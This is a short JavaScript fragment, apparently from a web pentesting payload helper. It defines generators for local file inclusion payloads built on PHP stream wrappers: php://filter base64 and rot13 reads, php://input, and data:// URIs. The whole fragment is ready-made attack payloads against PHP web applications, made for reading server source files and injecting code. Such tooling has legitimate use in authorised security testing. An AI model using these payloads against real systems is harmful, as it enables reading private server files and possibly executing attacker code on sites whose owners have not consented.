...
window.Payload.LFI = {
  php_encode_Bas64: value => 'php://filter/read=convert.base64-encode/resource=' + value,
  php_decode_Bas64: value => 'php://filter/write=convert.base64-encode/resource=' + value,
  php_input: value => 'php://input',
  php_rot13: value => 'php://filter/write=string.rot13/resource=' + value,
  data_raw: value => 'data://text/plain,' + value,
  data_base64: value => 'data://text/plain;base64,' + value
}
